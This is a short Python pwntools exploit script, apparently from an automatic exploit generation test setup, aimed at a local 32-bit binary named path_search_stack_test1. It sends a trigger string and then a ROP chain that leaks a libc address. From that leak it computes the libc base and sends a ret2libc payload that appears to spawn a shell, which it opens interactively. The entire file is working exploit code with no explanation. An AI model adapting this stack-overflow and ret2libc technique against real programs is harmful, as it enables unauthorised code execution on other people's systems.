from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/32bit/path_search_test/path_search_stack/path_search_stack_test1")
pwn.gdb.attach(p)
payload = b""
payload += b'hello world\x00\x00\x00\x00\x00'
p.send(payload)
p.recvuntil(b'you find it!\n')
payload = b"\x00" * 28
payload += p32(0x80483e0) + p32(0x80486cb) + p32(0x8049fe8) + p32(0x80483d0) + p32(0x80486c9) + p32(0x0) + p32(0x804a880) + p32(0xc) + p32(0x80486cb) + p32(0x804a87c) + p32(0x80484b5)
payload = payload.ljust(256, b"a")
p.send(payload)
libc_base = u32(p.recv()[0:4].ljust(4,b'\x00')) + -0x18eb0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p32(libc_base + 0x3d3d0) + p32(0x0) + p32(libc_base + 0x17e1db)
p.send(payload)
p.interactive()
